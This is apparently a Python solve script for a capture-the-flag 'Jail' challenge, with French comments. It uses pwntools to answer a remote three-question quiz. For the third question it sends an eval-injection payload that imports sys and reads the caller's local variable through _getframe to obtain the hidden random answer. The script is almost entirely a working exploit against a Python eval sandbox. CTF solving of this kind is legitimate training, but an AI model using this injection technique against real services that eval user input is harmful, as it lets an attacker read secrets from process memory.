#!/usr/bin/env python3
# Prairie of Learning (Pwny-CTF, Jail)
#
# Quiz en 3 questions ; score 3/3 -> flag. Les 2 premieres ont une reponse en
# clair dans le code. La 3e compare notre eval() a un random LOCAL inconnu
# (quiz_question_answer). eval tourne avec globals/locals vides {} mais Python
# reinjecte __builtins__ -> on a __import__. On remonte la frame appelante
# (sys._getframe(1) = do_quiz) et on lit sa variable locale directement.
from pwn import *

io = remote("chal.sigpwny.com", 7004)

io.sendlineafter(b"What is 1+2? > ", b"3")
io.sendlineafter(b"substring 000 > ", b"(0+1)*000(0+1)*")
io.sendlineafter(b"between 1 and 99999999 > ",
                 b"__import__('sys')._getframe(1).f_locals['quiz_question_answer']")

print(io.recvall(timeout=5).decode(errors="replace"))
